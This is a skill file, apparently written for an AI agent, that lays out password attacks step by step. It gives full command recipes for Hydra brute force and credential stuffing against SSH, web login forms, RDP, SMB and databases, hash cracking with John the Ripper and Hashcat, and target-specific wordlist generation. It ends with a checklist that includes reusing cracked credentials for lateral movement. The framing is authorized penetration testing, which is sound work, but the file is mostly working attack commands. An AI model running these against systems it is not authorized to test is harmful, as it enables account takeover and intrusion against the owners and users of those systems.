---
name: security/password-attack
description: Use when performing password-based attacks — online brute force, offline hash cracking, wordlist generation, and credential stuffing. Covers Hydra, John the Ripper, Hashcat, CeWL, and Crunch with complete recipes.
version: 1.0.0
author: OWL
license: MIT
metadata:
  hermes:
    tags: [security, password, hydra, john, hashcat, brute-force, credentials, cracking]
    related_skills:
      - security/workflow
      - security/network-recon
      - security/tool-setup
      - security/exploit-basics
---

# Password Attacks

## Overview

Password attacks are among the most effective techniques in penetration testing. This skill covers online attacks (Hydra against live services), offline attacks (John the Ripper and Hashcat against hash dumps), wordlist generation (CeWL, Crunch), and credential testing strategies.

## When to Use

- You've discovered login services (SSH, FTP, HTTP forms, RDP, etc.)
- You have a list of usernames and need to test credentials
- You've obtained password hashes and need to crack them
- You need to generate targeted wordlists based on the target
- You're testing password policy compliance

**Don't use for:** web application scanning (use `security/web-app-scan`), SQL injection (use `security/web-app-scan`).

## Tool Availability Check

```bash
hydra --version
john --version
hashcat --version
cewl --version
crunch --version 2>&1 | head -1
hashid -h 2>&1 | head -1
hash-identifier 2>&1 | head -1
```

Install: `sudo apt install hydra john hashcat cewl crunch hashid`

## Phase 1: Online Password Attacks (Hydra)

> ⚠️ **Warning:** Hydra sends many authentication requests. On production systems, this can trigger account lockouts or IDS alerts. Use low thread counts (`-t 4`) and consider the authentication lockout policy before testing.

### SSH
```bash
# Single user, wordlist
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target -t 4 -V

# Multiple users, single password
hydra -L users.txt -p Password123 ssh://target -t 4 -V

# Multiple users, multiple passwords
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://target -t 4 -V -o hydra_ssh.txt

# Specific port
hydra -l admin -P passwords.txt ssh://target -s 2222 -t 4 -V
```

### HTTP POST Form
```bash
# Generic POST form (adjust failure string for the target)
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 4 -V

# With cookie
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:F=incorrect" -t 4 -C "session=abc123"

# JSON POST body
hydra -l admin -P passwords.txt target.com http-post-form \
  "/api/auth:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:\"status\":\"error\"" -t 4 -V
```

### HTTP Basic/Digest Auth
```bash
hydra -l admin -P passwords.txt target.com http-get /admin -t 4 -V
hydra -l admin -P passwords.txt target.com http-head /admin -t 4 -V
```

### FTP
```bash
hydra -l admin -P passwords.txt ftp://target -t 4 -V
hydra -L users.txt -P passwords.txt ftp://target -t 4 -V -o hydra_ftp.txt
```

### RDP
```bash
hydra -l admin -P passwords.txt rdp://target -t 4 -V
hydra -L users.txt -P passwords.txt rdp://target -t 4 -V
```

### SMB
```bash
hydra -l admin -P passwords.txt smb://target -t 4 -V
hydra -L users.txt -P passwords.txt smb://target -t 4 -V
```

### MySQL / PostgreSQL / MSSQL
```bash
hydra -l root -P passwords.txt mysql://target -t 4 -V
hydra -l postgres -P passwords.txt postgres://target -t 4 -V
hydra -l sa -P passwords.txt mssql://target -t 4 -V
```

### Telnet
```bash
hydra -l admin -P passwords.txt telnet://target -t 4 -V
```

### Complete Hydra Service Reference
| Service | Module | Default Port |
|---------|--------|-------------|
| SSH | `ssh` | 22 |
| FTP | `ftp` | 21 |
| HTTP POST | `http-post-form` | 80/443 |
| HTTP GET | `http-get` | 80 |
| HTTP HEAD | `http-head` | 80 |
| HTTPS | `https-get` / `https-post-form` | 443 |
| RDP | `rdp` | 3389 |
| SMB | `smb` | 445 |
| MySQL | `mysql` | 3306 |
| PostgreSQL | `postgres` | 5432 |
| MSSQL | `mssql` | 1433 |
| Telnet | `telnet` | 23 |
| SNMP | `snmp` | 161 |
| POP3 | `pop3` | 110 |
| IMAP | `imap` | 143 |

## Phase 2: Offline Hash Cracking

### Step 1: Identify the Hash Type
```bash
# Using hashid
hashid 'hash_value_here'

# Using hash-identifier (interactive)
hash-identifier
# Then paste the hash

# Using hashcat's built-in detection
hashcat --identify hash.txt
```

### Step 2: John the Ripper

```bash
# Basic crack with auto-detect
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Specify format (faster, more accurate)
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt        # NTLM
john --format=lm --wordlist=/usr/share/wordlists/rockyou.txt hash.txt        # LM

# With rules (best64, KoreLogic, etc.)
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=KoreLogic hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=jumbo hash.txt     # All built-in

# Show already cracked passwords
john --show hash.txt

# Show cracked passwords for specific format
john --show --format=md5crypt hash.txt

# Resume interrupted session
john --restore

# Incremental mode (brute force, very slow)
john --incremental hash.txt

# List supported formats
john --list=formats
```

### Step 3: Hashcat (GPU-accelerated)

```bash
# Basic crack (specify mode number)
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt    # MD5
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt # NTLM
hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt # sha512crypt
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt # bcrypt
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt # NetNTLMv2

# With rules
hashcat -m 1000 -a 0 hash.txt wordlist.txt -r rules/best64.rule
hashcat -m 1000 -a 0 hash.txt wordlist.txt -r rules/dive.rule
hashcat -m 1000 -a 0 hash.txt wordlist.txt -r rules/rockyou-30000.rule

# Mask attack (pattern-based brute force)
hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a?a?a?a           # 8 chars, all types
hashcat -m 1000 -a 3 hash.txt ?l?l?l?l?d?d?d?d           # 4 lowercase + 4 digits
hashcat -m 1000 -a 3 hash.txt Password?d?d?d?d            # Prefix + digits

# Hybrid attack (wordlist + mask)
hashcat -m 1000 -a 6 hash.txt wordlist.txt ?d?d?d?d       # Word + 4 digits
hashcat -m 1000 -a 7 hash.txt ?d?d?d wordlist.txt         # 3 digits + word

# Benchmark
hashcat -b

# Show cracked
hashcat -m 1000 --show hash.txt

# Output cracked passwords to file
hashcat -m 1000 -a 0 hash.txt wordlist.txt --outfile=cracked.txt --outfile-format=2

# Potfile location (stores all cracked hashes)
cat ~/.hashcat/hashcat.potfile
```

### Common Hashcat Modes
| Mode | Hash Type | Example |
|------|-----------|---------|
| `-m 0` | MD5 | `5f4dcc3b5aa765d61d8327deb882cf99` |
| `-m 10` | md5($pass.$salt) | `hash:salt` |
| `-m 20` | md5($salt.$pass) | `salt:hash` |
| `-m 50` | HMAC-MD5 | `hash:key` |
| `-m 100` | SHA1 | `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` |
| `-m 1000` | NTLM | `b4b9b02e6f09a9bd760f388b67351e2b` |
| `-m 1400` | SHA256 | `hash` |
| `-m 1700` | SHA512 | `hash` |
| `-m 1800` | sha512crypt | `$6$salt$hash` |
| `-m 3200` | bcrypt | `$2a$10$saltsalt......hash` |
| `-m 5600` | NetNTLMv2 | `user::domain:challenge:hash` |
| `-m 13100` | Kerberos 5 TGS | `$krb5tgs$...` |
| `-m 22000` | WPA-PBKDF2 | (use with .hc22000 file) |

## Phase 3: Wordlist Generation

### CeWL (Custom Wordlist Generator)
```bash
# Basic — spider a site, extract words (min length 3)
cewl -d 2 -m 3 -w cewl_words.txt http://target.com

# Deep crawl, longer words, with email addresses
cewl -d 5 -m 5 -e -w cewl_deep.txt http://target.com

# With authentication
cewl -d 2 -m 3 -w cewl_auth.txt -a http://target.com

# Output metadata (useful for usernames)
cewl -d 2 -m 3 -w cewl_words.txt --meta cewl_meta.txt http://target.com
```

### Crunch (Pattern-based)
```bash
# Generate all 8-char lowercase combinations
crunch 8 8 abcdefghijklmnopqrstuvwxyz -o crunch_8lower.txt

# Pattern: 4 letters + 4 numbers
crunch 8 8 -t @@@@%%%% -o pattern_letters_numbers.txt

# Pattern: year-based passwords
crunch 8 8 -t Password@ -o pattern_password_year.txt

# Pattern charset file
crunch 6 6 -f /usr/share/crunch/charset.lst mixalpha-numeric -o mixed_6.txt
```

### Combination Strategies
```bash
# Combine two wordlists
john --wordlist=names.txt --rules=wordlist --stdout | \
  john --wordlist=--stdin --rules=wordlist --stdout | \
  sort -u > combined.txt

# Use hashcat utilities
# pwqgen (quality password generator)
pwqgen > quality_passwords.txt

# Combinator (combine words from two lists)
./combinator.bin wordlist1.txt wordlist2.txt > combined.txt

# Expand wordlist with common transformations
cat wordlist.txt | sed 's/e/3/g; s/a/4/g; s/o/0/g; s/i/1/g; s/$/123/g' > expanded.txt
```

## Phase 4: Credential Stuffing

```bash
# Prepare credential list (user:pass format)
cat > credentials.txt << 'EOF'
admin:Password123
admin:admin1234
admin:Welcome1
jsmith:Password123
EOF

# Test against SSH with credentials file
hydra -C credentials.txt ssh://target -t 4 -V

# Test against HTTP form with credentials file
hydra -C credentials.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" -t 4 -V
```

## Password Policy Analysis

When testing, check for:
- Minimum length requirements
- Complexity requirements (upper, lower, digit, special)
- Account lockout threshold (how many attempts before lockout)
- Lockout duration
- Password history (prevents reuse of last N passwords)

**Document the policy** — it affects your wordlist strategy and hydra timing.

## Common Pitfalls

1. **Hydra with `-t 16` on production.** This sends 16 concurrent requests and will trigger lockouts. Use `-t 4` for production.
2. **Not decompressing rockyou.txt.** On Kali: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz` before use.
3. **Wrong hash format in John.** John doesn't always auto-detect correctly. Use `--format=` to specify. Check `john --list=formats`.
4. **Hashcat without GPU.** Without a compatible GPU, hashcat is very slow. Use John for CPU-only cracking, or ensure NVIDIA/AMD drivers are installed.
5. **Not using rules.** A plain wordlist cracks maybe 10-20% of passwords. Adding `--rules=best64` or `dive.rule` increases to 30-50%.
6. **Ignoring the potfile.** Hashcat stores cracked hashes in `~/.hashcat/hashcat.potfile`. If you re-run, already-cracked hashes won't show unless you use `--potfile-disable`.
7. **Wrong failure string in Hydra.** If the success/failure string is wrong, Hydra will miss valid creds or report false positives. Test manually first.

## Verification Checklist

- [ ] All discovered login services tested
- [ ] Failure string verified manually before running Hydra
- [ ] Thread count set appropriately (`-t 4` for production)
- [ ] Hash type identified before cracking
- [ ] Wordlist decompressed if needed (rockyou.txt.gz)
- [ ] Rules applied for expanded coverage
- [ ] Cracked passwords documented with source hash
- [ ] Credentials tested for reuse across services (lateral movement)
